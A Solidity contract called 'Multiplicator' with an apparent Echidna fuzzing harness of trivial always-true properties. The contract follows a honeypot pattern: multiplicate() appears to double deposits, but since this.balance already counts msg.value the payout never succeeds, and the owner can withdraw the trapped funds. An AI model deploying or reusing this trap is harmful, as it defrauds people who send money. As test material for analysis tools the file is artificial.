pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;
   
    function()payable  public {}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiplicate(address adr)
    payable
    public
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}


contract MultiplicatorTest is Multiplicator {



    function echidna_alwaystrue() public returns (bool){
    return(true);
  }

  function echidna_alwaystrue2() public returns (bool){
    return(true);
  }

  function echidna_alwaystrue3() public returns (bool){
    return(true);
  }
  function echidna_low_level_call() public returns (bool) {
      address(0xcafe).call("");
      return true;
  }
}